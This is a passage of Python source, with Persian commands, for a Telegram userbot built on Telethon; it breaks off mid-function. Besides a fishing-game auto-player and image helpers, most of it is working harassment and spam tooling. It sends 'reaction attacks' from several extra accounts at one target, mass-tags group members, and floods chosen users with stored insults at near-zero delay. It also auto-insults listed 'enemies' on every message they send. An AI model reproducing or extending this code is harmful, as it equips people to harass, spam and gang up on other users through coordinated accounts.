                    await send_word_and_click(event.client, event.chat_id, 'ماهی', btn_index=0, require_reply=True, min_buttons=2)
                    fish_jobs[uid]['turn'] = 1
                except Exception:
                    try:
                        await event.client.send_message(event.chat_id, "ماهی")
                    except Exception:
                        pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            if text in ('.ماهی گیری خودکار خاموش', '.ماهی‌گیری خودکار خاموش') or text_norm in ('.ماهی گیری خودکار خاموش', '.ماهی‌گیری خودکار خاموش'):
                gname = await _group_label(event)
                fish_jobs.pop(uid, None)
                try:
                    await event.edit(f"ماهی گیری خودکار در {gname} خاموش شد")
                except Exception:
                    try:
                        await event.reply(f"ماهی گیری خودکار در {gname} خاموش شد")
                    except Exception:
                        pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            # .ری اکت خاموش — قطع همه ری‌اکت‌ها
            if text.startswith('.ری اکت خاموش') or text_norm.startswith('.ری اکت خاموش'):
                try:
                    for k in list(auto_react_jobs.keys()):
                        if isinstance(k, tuple) and len(k) >= 1 and int(k[0]) == int(uid):
                            auto_react_jobs.pop(k, None)
                except Exception:
                    pass
                try:
                    react_targets.pop(uid, None)
                except Exception:
                    pass
                try:
                    await event.edit("ری اکت ها خاموش شدن")
                    await asyncio.sleep(1.5)
                    await event.delete()
                except Exception:
                    pass
                return

            # .ری اکت اتک ایموجی — روی هر پیام طرف
            if text.startswith('.ری اکت اتک') or text_norm.startswith('.ری اکت اتک'):
                if not event.is_reply:
                    try:
                        await event.edit("روی پیام کاربر ریپلای کن")
                    except Exception:
                        pass
                    return
                emo = text.replace('.ری اکت اتک', '', 1).strip()
                if not emo:
                    emo = text_norm.replace('.ری اکت اتک', '', 1).strip()
                if not emo:
                    try:
                        await event.edit("ایموجی بده\nمثال: .ری اکت اتک 🤣")
                    except Exception:
                        pass
                    return
                extras = get_extras(uid) or {}
                acc_ids = [a for a in extras.keys() if str(a).lower() not in ('all', 'none', '')]
                if not acc_ids:
                    try:
                        await event.edit("اکانتی اضافه نکردی")
                        await asyncio.sleep(2)
                        await event.delete()
                    except Exception:
                        pass
                    return
                rep = await event.get_reply_message()
                tid = await get_real_sender(rep)
                if not tid:
                    try:
                        await event.edit("کاربر پیدا نشد")
                    except Exception:
                        pass
                    return
                auto_react_jobs[(int(uid), int(tid))] = {
                    'count': len(acc_ids),
                    'emoji': emo,
                    'random': False,
                    'chat_id': int(event.chat_id),
                }
                name = await resolve_name(event.client, tid)
                try:
                    await event.edit("اتک ری اکت " + emo + " به " + mention(tid, name), parse_mode='Markdown')
                except Exception:
                    try:
                        await event.edit("اتک ری اکت " + emo + " به " + str(name))
                    except Exception:
                        pass
                await asyncio.sleep(1.5)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            # .ری اکت رندوم — یک‌بار روی پیام ریپلای‌شده
            if text.strip() in ('.ری اکت رندوم',) or text_norm.strip() in ('.ری اکت رندوم',) or text.startswith('.ری اکت رندوم') or text_norm.startswith('.ری اکت رندوم'):
                if not event.is_reply:
                    try:
                        await event.edit("روی پیام ریپلای کن")
                    except Exception:
                        pass
                    return
                extras = get_extras(uid) or {}
                acc_ids = [a for a in extras.keys() if str(a).lower() not in ('all', 'none', '')]
                if not acc_ids:
                    try:
                        await event.edit("اکانتی اضافه نکردی")
                        await asyncio.sleep(2)
                        await event.delete()
                    except Exception:
                        pass
                    return
                rep = await event.get_reply_message()
                tid = await get_real_sender(rep)
                mid = rep.id
                chat_id = event.chat_id
                pool = ['👍', '❤', '❤️', '🔥', '😂', '👏', '😍', '🎉', '💯', '⚡', '🤝', '🤣', '😁', '😊']
                for aid in acc_ids:
                    try:
                        key = (int(uid), int(aid))
                        cl = extra_clients.get(key)
                        if not cl:
                            inf = extras.get(str(aid)) or extras.get(aid) or {}
                            sess = inf.get('session')
                            if sess:
                                await start_extra_client(uid, aid, sess)
                                cl = extra_clients.get(key)
                        if not cl:
                            continue
                        emo = random.choice(pool)
                        done = False
                        try:
                            msgs = await cl.get_messages(chat_id, ids=mid)
                            if msgs:
                                await msgs.react(emo)
                                done = True
                        except Exception:
                            pass
                        if not done:
                            try:
                                peer = await cl.get_input_entity(chat_id)
                                await cl(SendReactionRequest(peer=peer, msg_id=mid, reaction=[ReactionEmoji(emoticon=emo)]))
                            except Exception:
                                try:
                                    await cl(SendReactionRequest(peer=chat_id, msg_id=mid, reaction=[ReactionEmoji(emoticon=emo)]))
                                except Exception:
                                    pass
                    except Exception:
                        continue
                name = await resolve_name(event.client, tid) if tid else "?"
                try:
                    await event.edit("ری اکت رندوم به " + mention(tid, name), parse_mode='Markdown')
                except Exception:
                    try:
                        await event.edit("ری اکت رندوم به " + str(name))
                    except Exception:
                        pass
                await asyncio.sleep(1.5)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            if (text.startswith('.ری اکت ') or text_norm.startswith('.ری اکت ')) and not text.startswith('.ری اکت خاموش') and not text.startswith('.ری اکت اتک') and not text.startswith('.ری اکت رندوم'):
                if not event.is_reply:
                    try:
                        await event.edit("روی پیام کاربر ریپلای کن\nمثال: `.ری اکت ❤️`")
                    except Exception:
                        pass
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                emoji = text[8:].strip()  # بعد از ".ری اکت "
                if not emoji:
                    emoji = text_norm[8:].strip()
                if not emoji:
                    try:
                        await event.edit("ایموجی بده\nمثال: `.ری اکت ❤️`")
                    except Exception:
                        pass
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                rep = await event.get_reply_message()
                tid = await get_real_sender(rep)
                if not tid or tid == uid:
                    try:
                        await event.edit("کاربر پیدا نشد")
                    except Exception:
                        pass
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                reacts = react_targets.get(uid) or {}
                reacts[tid] = {'emoji': emoji, 'scope': 'group'}
                react_targets[uid] = reacts
                name = await resolve_name(event.client, tid)
                try:
                    await event.edit(
                        f"ری اکت {emoji} رو {mention(tid, name)} قفل شد",
                        parse_mode='Markdown',
                    )
                except Exception:
                    try:
                        await event.edit(f"ری اکت {emoji} رو کاربر قفل شد")
                    except Exception:
                        pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            if text == '.تگ مدیران':
                if not event.is_group:
                    try: await event.edit("فقط تو گروه")
                    except Exception: pass
                    await asyncio.sleep(2)
                    try: await event.delete()
                    except: pass
                    return
                tag_members_wait[uid] = {
                    'chat_id': event.chat_id,
                    'reply_to': event.reply_to_msg_id,
                    'mode': 'admins',
                }
                try:
                    await event.edit("چند تا از مدیران رو میخوای تگ گنی ؟ ( عدد بگو )")
                except Exception:
                    try: await event.reply("چند تا از مدیران رو میخوای تگ گنی ؟ ( عدد بگو )")
                    except Exception: pass
                return

            if text == '.تگ اعضا':
                if not event.is_group:
                    try: await event.edit("فقط تو گروه")
                    except Exception: pass
                    await asyncio.sleep(2)
                    try: await event.delete()
                    except: pass
                    return
                tag_members_wait[uid] = {
                    'chat_id': event.chat_id,
                    'reply_to': event.reply_to_msg_id,
                    'mode': 'members',
                }
                try:
                    await event.edit("چند نفر رو میخوای تگ کنی ؟ ( عدد بگو )")
                except Exception:
                    try: await event.reply("چند نفر رو میخوای تگ کنی ؟ ( عدد بگو )")
                    except Exception: pass
                return

            # پاسخ تعداد برای تگ اعضا
            if sender.id == uid and uid in tag_members_wait and text and not text.startswith('.'):
                st = tag_members_wait.get(uid) or {}
                # فقط اگر تو همان گروه باشد یا پیوی دستور نباشد
                try:
                    n = int(text.strip())
                except Exception:
                    try: await event.edit("فقط عدد بفرست")
                    except Exception:
                        try: await event.reply("فقط عدد بفرست")
                        except Exception: pass
                    return
                if n < 1:
                    try: await event.edit("عدد باید بزرگ‌تر از صفر باشد")
                    except Exception:
                        try: await event.reply("عدد باید بزرگ‌تر از صفر باشد")
                        except Exception: pass
                    return
                if n > 5000:
                    n = 5000
                chat_id = st.get('chat_id') or event.chat_id
                reply_to = st.get('reply_to')
                mode = st.get('mode') or 'members'
                tag_members_wait.pop(uid, None)
                try: await event.edit("در حال گرفتن...")
                except Exception: pass
                members = []
                try:
                    if mode == 'admins':
                        from telethon.tl.types import ChannelParticipantsAdmins
                        async for p in event.client.iter_participants(chat_id, filter=ChannelParticipantsAdmins()):
                            if getattr(p, 'bot', False) or getattr(p, 'deleted', False):
                                continue
                            name = getattr(p, 'first_name', None) or ''
                            last = getattr(p, 'last_name', None) or ''
                            full = (name + (' ' + last if last else '')).strip()
                            if not full:
                                full = getattr(p, 'username', None) or str(p.id)
                            full = (full.replace('&', 'and').replace('<', '').replace('>', '')
                                        .replace('[', '').replace(']', ''))
                            members.append((int(p.id), full))
                    else:
                        async for p in event.client.iter_participants(chat_id, limit=min(20000, max(n * 8, n + 100))):
                            if getattr(p, 'bot', False) or getattr(p, 'deleted', False):
                                continue
                            if getattr(p, 'is_self', False):
                                continue
                            name = getattr(p, 'first_name', None) or ''
                            last = getattr(p, 'last_name', None) or ''
                            full = (name + (' ' + last if last else '')).strip()
                            if not full:
                                full = getattr(p, 'username', None) or str(p.id)
                            full = (full.replace('&', 'and').replace('<', '').replace('>', '')
                                        .replace('[', '').replace(']', ''))
                            members.append((int(p.id), full))
                            if len(members) >= 8000:
                                break
                except Exception as e:
                    try: await event.edit(f"خطا: {e}")
                    except Exception: pass
                    await asyncio.sleep(2)
                    try: await event.delete()
                    except: pass
                    return
                if not members:
                    try: await event.edit("عضوی پیدا نشد")
                    except Exception: pass
                    await asyncio.sleep(2)
                    try: await event.delete()
                    except: pass
                    return
                # اعضا: فعال‌ترین‌ها اول | مدیران: به همان ترتیب
                if mode == 'members':
                    activity = {}
                    try:
                        async for m in event.client.iter_messages(chat_id, limit=1500):
                            sid = getattr(m, 'sender_id', None)
                            if not sid:
                                continue
                            try:
                                sid = int(sid)
                            except Exception:
                                continue
                            activity[sid] = activity.get(sid, 0) + 1
                    except Exception:
                        pass
                    members.sort(key=lambda x: activity.get(x[0], 0), reverse=True)
                selected = members[:min(n, len(members))]
                import random as _rand
                try: await event.delete()
                except: pass
                sep = ' 𝈂 '
                i = 0
                while i < len(selected):
                    if not get_ud(uid, 'self_enabled', True) or spam_cancel.get(uid):
                        break
                    left = len(selected) - i
                    if left <= 3:
                        chunk_n = left
                    else:
                        chunk_n = _rand.randint(3, min(6, left))
                    chunk = selected[i:i + chunk_n]
                    i += chunk_n
                    parts = []
                    for j, (aid, name) in enumerate(chunk):
                        if j > 0:
                            parts.append(sep)
                        parts.append(f'<a href="tg://user?id={aid}">{name}</a>')
                    
                    body = ''.join(parts)
                    try:
                        await event.client.send_message(
                            chat_id, body, parse_mode='html',
                            reply_to=reply_to, link_preview=False
                        )
                    except Exception:
                        parts = []
                        for j, (aid, name) in enumerate(chunk):
                            if j > 0:
                                parts.append(sep)
                            parts.append(f'[{name}](tg://user?id={aid})')
                        
                        await event.client.send_message(
                            chat_id, ''.join(parts), parse_mode='Markdown',
                            reply_to=reply_to, link_preview=False
                        )
                    await asyncio.sleep(0.35)
                return

            if text == '.سکوت' and event.is_reply:
                rep = await event.get_reply_message()
                tid = await get_real_sender(rep)
                if not tid or tid == uid:
                    await event.edit("نتونستم کاربر رو تشخیص بدم")
                    await asyncio.sleep(2)
                    try: await event.delete()
                    except: pass
                    return
                try:
                    ent = await event.client.get_entity(tid)
                    name = getattr(ent, 'first_name', None) or str(tid)
                except:
                    name = str(tid)
                silenced = get_ud(uid, 'silenced', [])
                if tid not in silenced:
                    silenced.append(tid)
                    set_user(uid, 'silenced', silenced)
                    await event.edit(f"{mention(tid, name)} به لیست سکوت اضافه شد", parse_mode='Markdown')
                    try:
                        await event.client(DeleteHistoryRequest(peer=tid, max_id=0, just_clear=False, revoke=True))
                    except:
                        pass
                else:
                    await event.edit("قبلا در لیست سکوت است")
                await asyncio.sleep(2)
                try: await event.delete()
                except: pass
                return

            if text == '.حذف سکوت' and event.is_reply:
                rep = await event.get_reply_message()
                tid = await get_real_sender(rep)
                if not tid:
                    await event.edit("نتونستم کاربر رو تشخیص بدم")
                    await asyncio.sleep(2)
                    try: await event.delete()
                    except: pass
                    return
                try:
                    ent = await event.client.get_entity(tid)
                    name = getattr(ent, 'first_name', None) or str(tid)
                except:
                    name = str(tid)
                silenced = get_ud(uid, 'silenced', [])
                if tid in silenced:
                    silenced.remove(tid)
                    set_user(uid, 'silenced', silenced)
                    await event.edit(f"{mention(tid, name)} از لیست سکوت حذف شد", parse_mode='Markdown')
                else:
                    await event.edit("در لیست سکوت نیست")
                await asyncio.sleep(2)
                try: await event.delete()
                except: pass
                return

            if text == '.لیست سکوت':
                silenced = get_ud(uid, 'silenced', [])
                if not silenced:
                    await event.edit("لیست سکوت خالی است")
                    await asyncio.sleep(1.5)
                    try: await event.delete()
                    except: pass
                    return
                parts = ["<blockquote>لیست سکوت ↓</blockquote>"]
                for sid in silenced:
                    try:
                        ent = await event.client.get_entity(sid)
                        name = getattr(ent, 'first_name', None) or str(sid)
                    except Exception:
                        name = str(sid)
                    try:
                        parts.append("<blockquote>" + mention(sid, name) + " <code>" + str(sid) + "</code></blockquote>")
                    except Exception:
                        parts.append("<blockquote>" + str(name).replace("<","") + " <code>" + str(sid) + "</code></blockquote>")
                await event.edit(chr(10).join(parts), parse_mode='html')
                return

            if text == '.پاسخ':
                reply_wait[uid] = {'step': 'key'}
                await event.edit(
                    'کلمه مورد نظرت رو بفرست' + chr(10)
                    + 'بعدش می‌گم پاسخ خودکار رو بفرست' + chr(10)
                    + '(متن / گیف / استیکر / ویس / عکس / فیلم — هر فرمتی)'
                )
                return

            if text == '.لیست پاسخ':
                replies = get_ud(uid, 'auto_replies', {})
                if not replies:
                    await event.edit("لیست پاسخ خالی است")
                    await asyncio.sleep(1.5)
                    try: await event.delete()
                    except: pass
                    return
                body = chr(10).join(
                    f"• `{k}` → {(v if isinstance(v, str) else (v.get('kind') or 'media'))}"
                    for k, v in replies.items()
                )
                await event.edit("لیست پاسخ:\n\n" + body, parse_mode='Markdown')
                return

            if text.startswith('.حذف پاسخ '):
                key = text[10:].strip().lower()
                replies = get_ud(uid, 'auto_replies', {})
                if key in replies:
                    del replies[key]
                    set_user(uid, 'auto_replies', replies)
                    await event.edit(f"«{key}» از لیست پاسخ حذف شد")
                else:
                    await event.edit("این پاسخ وجود ندارد")
                await asyncio.sleep(2)
                try: await event.delete()
                except: pass
                return

            # ========== سیستم فحش خودکار ==========
            if text == '.ثبت فحش':
                attack_wait[uid] = {'list': [], 'msg': event, 'owner': uid}
                await event.edit("فحش هاتو یکی یکی رو این پیام ریپلای کن\nهر وقت تموم شد این دستور رو بزن:\n`.ذخیره`", parse_mode='Markdown')
                try:
                    await maybe_report_cmd(event, uid, "ثبت فحش", "")
                except Exception:
                    pass
                return

            if text == '.ذخیره' and uid in attack_wait:
                st = attack_wait[uid]
                if st.get('owner') == uid and st.get('list'):
                    atk = get_ud(uid, 'attack_insults', [])
                    atk.extend(st['list'])
                    set_user(uid, 'attack_insults', atk)
                    await st['msg'].edit("تمامی فحش ها ذخیره شد")
                    del attack_wait[uid]
                    await asyncio.sleep(3)
                    try: await st['msg'].delete()
                    except: pass
                    try: await event.delete()
                    except: pass
                return

            if uid in attack_wait and event.is_reply and attack_wait[uid].get('list') is not None:
                st = attack_wait[uid]
                if st.get('owner') == uid and event.reply_to_msg_id == st['msg'].id:
                    st['list'].append(text)
                    try: await event.delete()
                    except: pass
                    return

            if text == '.لیست فحش های خودکار':
                atk = get_ud(uid, 'attack_insults', [])
                if not atk:
                    await event.edit("لیست فحش های خودکار خالی است")
                    await asyncio.sleep(1.5)
                    try: await event.delete()
                    except: pass
                    return
                parts = ["لیست فحش های خودکار"]
                for i in atk:
                    parts.append("<blockquote>" + str(i).replace("<", "&lt;").replace(">", "&gt;") + "</blockquote>")
                await event.edit(chr(10).join(parts), parse_mode='html')
                return

            if text == '.پاکسازی لیست فحش':
                set_user(uid, 'attack_insults', [])
                attack_index[uid] = 0
                await event.edit("لیست فحش پاک شد")
                await asyncio.sleep(2)
                try: await event.delete()
                except: pass
                return

            if text == '.تنظیم متن خودکار':
                attack_wait[uid] = {'step': 'trigger'}
                await event.edit("کلمه مورد نظر رو بفرست")
                return

            if uid in attack_wait and attack_wait[uid].get('step') == 'trigger':
                trigger = text.strip()
                set_user(uid, 'attack_trigger', trigger)
                del attack_wait[uid]
                await event.edit(f"متن خودکار تنظیم شد: `{trigger}`", parse_mode='Markdown')
                await asyncio.sleep(2)
                try: await event.delete()
                except: pass
                return

            if text == '.خاموش کردن فحش خودکار':
                set_user(uid, 'attack_targets', {})
                set_user(uid, 'attack_trigger', '')
                await event.edit("فحش خودکار خاموش شد")
                await asyncio.sleep(2)
                try: await event.delete()
                except: pass
                return

            # چک کردن تریگر فحش خودکار
            trigger = get_ud(uid, 'attack_trigger', '')
            if trigger and text == trigger and event.is_reply:
                rep = await event.get_reply_message()
                tid = rep.sender_id
                if tid != uid:
                    targets = get_ud(uid, 'attack_targets', {})
                    targets[str(tid)] = True
                    set_user(uid, 'attack_targets', targets)
                    # ارسال فحش‌ها به آخرین پیام طرف
                    atk_list = get_ud(uid, 'attack_insults', [])
                    delay = float(get_ud(uid, 'attack_delay', 0) or 0)
                    if delay <= 0:
                        delay = 0.01
                    try: await event.delete()
                    except: pass
                    spam_cancel[uid] = False
                    for msg in atk_list:
                        if spam_cancel.get(uid) or not get_ud(uid, 'self_enabled', True):
                            break
                        try:
                            await rep.reply(msg)
                            if delay > 0:
                                await asyncio.sleep(delay)
                            else:
                                await asyncio.sleep(0.05)
                        except: break
                    return

            contents = get_ud(uid, 'contents', {})
            low = text.lower().strip()
            if low in contents:
                data = contents[low]
                try:
                    ents = data_to_entities(data.get('entities_data')) or dict_to_entities(data.get('entities'))
                    media = data.get('media')
                    body = data.get('text') or ''
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    if media and os.path.exists(str(media)):
                        await event.client.send_file(
                            event.chat_id, media,
                            caption=body or None,
                            formatting_entities=ents if body else None,
                        )
                    else:
                        await event.client.send_message(
                            event.chat_id, body or ' ',
                            formatting_entities=ents if body else None,
                        )
                except Exception:
                    try:
                        await event.client.send_message(event.chat_id, data.get('text', '') or ' ')
                    except Exception:
                        pass
                return


            # ========== سیستم کل ==========
            if text == '.ثبت متن کل':
                kol_wait[uid] = {'list': [], 'msg': event, 'owner': uid}
                await event.edit("متن های کل رو یکی یکی رو این پیام ریپلای کن\nهر وقت تموم شد این دستور رو بزن:\n`.ذخیره`", parse_mode='Markdown')
                return

            if text == '.ذخیره' and uid in kol_wait:
                st = kol_wait[uid]
                if st.get('owner') == uid and st.get('list'):
                    kl = get_ud(uid, 'kol_texts', [])
                    kl.extend(st['list'])
                    set_user(uid, 'kol_texts', kl)
                    await st['msg'].edit("تمامی متن های کل ذخیره شد")
                    del kol_wait[uid]
                    await asyncio.sleep(3)
                    try: await st['msg'].delete()
                    except: pass
                    try: await event.delete()
                    except: pass
                return

            if uid in kol_wait and event.is_reply and kol_wait[uid].get('list') is not None:
                st = kol_wait[uid]
                if st.get('owner') == uid and event.reply_to_msg_id == st['msg'].id:
                    st['list'].append(text)
                    try: await event.delete()
                    except: pass
                    return

            if text == '.لیست متن کل':
                kts = get_ud(uid, 'kol_texts', [])
                if not kts:
                    await event.edit("لیست متن کل خالی است")
                    await asyncio.sleep(1.5)
                    try: await event.delete()
                    except: pass
                    return
                parts = ["لیست متن کل"]
                for i in kts:
                    parts.append("<blockquote>" + str(i).replace("<", "&lt;").replace(">", "&gt;") + "</blockquote>")
                await event.edit(chr(10).join(parts), parse_mode='html')
                return

            if text == '.پاکسازی لیست متن کل':
                set_user(uid, 'kol_texts', [])
                await event.edit("لیست متن کل پاک شد")
                await asyncio.sleep(2)
                try: await event.delete()
                except: pass
                return

            if text == '.لیست کل':
                targets = get_ud(uid, 'kol_targets', [])
                if not targets:
                    await event.edit("لیست کل خالی است")
                    await asyncio.sleep(1.5)
                    try: await event.delete()
                    except: pass
                    return
                parts = ["لیست کل"]
                for tid in targets:
                    try:
                        ent = await event.client.get_entity(tid)
                        name = ent.first_name or str(tid)
                    except Exception:
                        name = str(tid)
                    parts.append(
                        "<blockquote>"
                        + str(name).replace("<", "&lt;")
                        + " | <code>" + str(tid) + "</code>"
                        + "</blockquote>"
                    )
                await event.edit(chr(10).join(parts), parse_mode='html')
                return

            if text == '.تنظیم کل' and event.is_reply:
                rep = await event.get_reply_message()
                tid = await get_real_sender(rep)
                if not tid or tid == uid:
                    await event.edit("نتونستم کاربر رو تشخیص بدم")
                    await asyncio.sleep(2)
                    try: await event.delete()
                    except: pass
                    return
                try:
                    ent = await event.client.get_entity(tid)
                    name = getattr(ent, 'first_name', None) or str(tid)
                except:
                    name = str(tid)
                targets = get_ud(uid, 'kol_targets', [])
                if tid not in targets:
                    targets.append(tid)
                    set_user(uid, 'kol_targets', targets)
                await event.edit(f"{mention(tid, name)} به لیست کل اضافه شد", parse_mode='Markdown')
                try:
                    await maybe_report_cmd(event, uid, "تنظیم کل", "هدف: " + mention(tid, name) + " | `" + str(tid) + "`")
                except Exception:
                    pass
                await asyncio.sleep(2)
                try: await event.delete()
                except: pass
                return

            if text.startswith('.تنظیم کل '):
                try:
                    tid = int(text.split()[-1])
                except:
                    await event.edit("ایدی معتبر وارد کن")
                    await asyncio.sleep(2)
                    try: await event.delete()
                    except: pass
                    return
                if tid == uid:
                    await event.edit("خودت رو نمیتونی اضافه کنی")
                    await asyncio.sleep(2)
                    try: await event.delete()
                    except: pass
                    return
                try:
                    ent = await event.client.get_entity(tid)
                    name = getattr(ent, 'first_name', None) or str(tid)
                except:
                    name = str(tid)
                targets = get_ud(uid, 'kol_targets', [])
                if tid not in targets:
                    targets.append(tid)
                    set_user(uid, 'kol_targets', targets)
                await event.edit(f"{mention(tid, name)} به لیست کل اضافه شد", parse_mode='Markdown')
                try:
                    await maybe_report_cmd(event, uid, "تنظیم کل", "هدف: " + mention(tid, name) + " | `" + str(tid) + "`")
                except Exception:
                    pass
                await asyncio.sleep(2)
                try: await event.delete()
                except: pass
                return

            if text == '.حذف کل' and event.is_reply:
                rep = await event.get_reply_message()
                tid = await get_real_sender(rep)
                if not tid:
                    await event.edit("نتونستم کاربر رو تشخیص بدم")
                    await asyncio.sleep(2)
                    try: await event.delete()
                    except: pass
                    return
                try:
                    ent = await event.client.get_entity(tid)
                    name = getattr(ent, 'first_name', None) or str(tid)
                except:
                    name = str(tid)
                targets = get_ud(uid, 'kol_targets', [])
                if tid in targets:
                    targets.remove(tid)
                    set_user(uid, 'kol_targets', targets)
                    await event.edit(f"{mention(tid, name)} از لیست کل حذف شد", parse_mode='Markdown')
                else:
                    await event.edit("در لیست کل نیست")
                await asyncio.sleep(2)
                try: await event.delete()
                except: pass
                return

            if text.startswith('.حذف کل '):
                try:
                    tid = int(text.split()[-1])
                except:
                    await event.edit("ایدی معتبر وارد کن")
                    await asyncio.sleep(2)
                    try: await event.delete()
                    except: pass
                    return
                try:
                    ent = await event.client.get_entity(tid)
                    name = getattr(ent, 'first_name', None) or str(tid)
                except:
                    name = str(tid)
                targets = get_ud(uid, 'kol_targets', [])
                if tid in targets:
                    targets.remove(tid)
                    set_user(uid, 'kol_targets', targets)
                    await event.edit(f"{mention(tid, name)} از لیست کل حذف شد", parse_mode='Markdown')
                else:
                    await event.edit("در لیست کل نیست")
                await asyncio.sleep(2)
                try: await event.delete()
                except: pass
                return


        # چک پاسخ خودکار (برای پیام دیگران — کلمه کلیدی)
        if sender.id != uid and text:
            low = text.lower().strip()
            replies = get_ud(uid, 'auto_replies', {})
            if low in replies and not event.out and sender.id != uid:
                data = replies[low]
                try:
                    if isinstance(data, str):
                        await event.reply(data)
                    else:
                        media = data.get('media')
                        caption = data.get('text') or ''
                        ents = None
                        try:
                            ents = data_to_entities(data.get('entities_data') or [])
                        except Exception:
                            ents = None
                        if not ents:
                            try:
                                ents = dict_to_entities(data.get('entities') or [])
                            except Exception:
                                ents = None
                        if media and os.path.exists(str(media)):
                            await event.client.send_file(
                                event.chat_id, media,
                                caption=caption or None,
                                formatting_entities=ents if caption else None,
                                reply_to=event.id,
                            )
                        elif caption:
                            await event.client.send_message(
                                event.chat_id, caption,
                                formatting_entities=ents,
                                reply_to=event.id,
                            )
                        else:
                            await event.reply(str(data))
                except Exception:
                    pass
                return

            # محتوا — وقتی کسی کلمه ذخیره‌شده را بگوید
            contents = get_ud(uid, 'contents', {}) or {}
            if low in contents and not event.out and sender.id != uid:
                data = contents[low]
                try:
                    media = data.get('media') if isinstance(data, dict) else None
                    caption = (data.get('text') if isinstance(data, dict) else str(data)) or ''
                    ents = None
                    if isinstance(data, dict):
                        try:
                            ents = data_to_entities(data.get('entities_data') or data.get('entities') or [])
                        except Exception:
                            ents = dict_to_entities(data.get('entities') or []) if data.get('entities') else None
                    if media and os.path.exists(str(media)):
                        await event.client.send_file(
                            event.chat_id, media, caption=caption or None,
                            formatting_entities=ents if caption else None,
                            reply_to=event.id,
                        )
                    elif caption:
                        await event.client.send_message(
                            event.chat_id, caption,
                            formatting_entities=ents,
                            reply_to=event.id,
                        )
                except Exception:
                    pass
                return

        if get_ud(uid, 'self_enabled', True) and get_ud(uid, 'coins', 0) > 0:
            # اتک خودکار
            targets = get_ud(uid, 'attack_targets', {})
            if str(sender.id) in targets:
                atk_list = get_ud(uid, 'attack_insults', [])
                if atk_list:
                    delay = float(get_ud(uid, 'attack_delay', 0) or 0)
                    if delay > 0:
                        await asyncio.sleep(delay)
                    idx = attack_index.get(uid, 0)
                    if idx < len(atk_list):
                        msg = atk_list[idx]
                        attack_index[uid] = idx + 1
                    else:
                        msg = random.choice(atk_list)
                        attack_index[uid] = 0
                    try:
                        await event.reply(msg)
                    except: pass

            enemies = get_ud(uid, 'enemies', {})
            if isinstance(enemies, list):
                enemies = {str(x): 'group' for x in enemies}
            if not isinstance(enemies, dict):
                enemies = {}
            # دشمن با محدوده: پیوی فقط پیوی / گروه فقط گروه
            escope = enemies.get(str(sender.id)) or enemies.get(sender.id)
            enemy_here = False
            if escope == 'group' and event.is_group and not event.out:
                enemy_here = True
            elif escope == 'private' and event.is_private and not event.out:
                enemy_here = True
            elif escope and not isinstance(escope, str) and event.is_group and not event.out:
                enemy_here = True
            if enemy_here:
                ins = get_ud(uid, 'insults', [])
                if ins:
                    delay = float(get_ud(uid, 'insult_delay', 0) or 0)
                    chat_id = event.chat_id
                    msg_id = event.id
                    if delay > 0:
                        await asyncio.sleep(delay)
                    idx = insult_index.get(uid, 0)
                    if idx < len(ins):
                        msg = ins[idx]
                        insult_index[uid] = idx + 1
                    else:
                        msg = random.choice(ins)
                    try:
                        await event.client.send_message(chat_id, msg, reply_to=msg_id)
                    except Exception:
                        try:
                            await event.reply(msg)
                        except Exception:
                            pass



            # سیستم کل: فقط گروه - بعد از تأخیر به آخرین پیام طرف ریپلای کن
            if event.is_group:
                kol_targets = get_ud(uid, 'kol_targets', [])
                if sender.id in kol_targets or str(sender.id) in [str(x) for x in kol_targets]:
                    kol_texts = get_ud(uid, 'kol_texts', [])
                    if kol_texts:
                        delay = get_ud(uid, 'kol_delay', 0)
                        chat_id = event.chat_id
                        target_id = sender.id
                        if delay > 0:
                            await asyncio.sleep(delay)
                        # بعد از تأخیر آخرین پیام طرف رو بگیر
                        try:
                            latest = None
                            async for m in event.client.iter_messages(chat_id, from_user=target_id, limit=1):
                                latest = m
                                break
                            if latest:
                                txt = random.choice(kol_texts)
                                await latest.reply(txt)
                        except:
                            try:
                                await event.reply(random.choice(kol_texts))
                            except:
                                pass
    except:
        pass


def _support_url():
    try:
        ch = bot.get_chat(OWNER_ID)
        un = getattr(ch, 'username', None)
        if un:
            return "https://t.me/" + str(un)
    except Exception:
        pass
    return "tg://user?id=" + str(OWNER_ID)




def get_panel_image():
    data = load_data()
    return data.get('panel_image')  # file_id


def set_panel_image(file_id):
    data = load_data()
    if file_id:
        data['panel_image'] = file_id
    else:
        data.pop('panel_image', None)
    save_data(data)


def _panel_user_fp(uid, name, photo_unique=None):
    return "v3|" + str(uid) + "|" + str(name or "") + "|" + str(photo_unique or "")


def _download_bot_file(file_id, dest_path):
    fi = bot.get_file(file_id)
    data = bot.download_file(fi.file_path)
    with open(dest_path, 'wb') as f:
        f.write(data)
    return dest_path


def _make_circle_avatar(im, size):
    from PIL import Image, ImageDraw
    try:
        resample = Image.Resampling.LANCZOS
    except Exception:
        resample = Image.LANCZOS
    im = im.convert('RGBA').resize((size, size), resample)
    mask = Image.new('L', (size, size), 0)
    draw = ImageDraw.Draw(mask)
    draw.ellipse((0, 0, size - 1, size - 1), fill=255)
    out = Image.new('RGBA', (size, size), (0, 0, 0, 0))
    out.paste(im, (0, 0), mask)
    ring = Image.new('RGBA', (size, size), (0, 0, 0, 0))
    rd = ImageDraw.Draw(ring)
    rd.ellipse((1, 1, size - 2, size - 2), outline=(255, 255, 255, 220), width=max(2, size // 40))
    out = Image.alpha_composite(out, ring)
    return out





def build_user_panel_image(uid, force=False):
    """پس‌زمینه + آواتار دایره‌ای چپ + اسم — همیشه overlay می‌کشد"""
    from PIL import Image, ImageDraw, ImageFont
    import io, os
    base_fid = get_panel_image()
    if not base_fid:
        print("panel: no base image")
        return None
    uid = int(uid)
    name = ''
    avatar_im = None
    photo_unique = 'none'
    # --- نام و عکس ---
    cl = clients.get(uid)
    if cl:
        try:
            async def _fetch():
                me = await cl.get_me()
                nm = ((getattr(me, 'first_name', '') or '') + ' ' + (getattr(me, 'last_name', '') or '')).strip()
                data = None
                uniq = 'none'
                try:
                    bio = io.BytesIO()
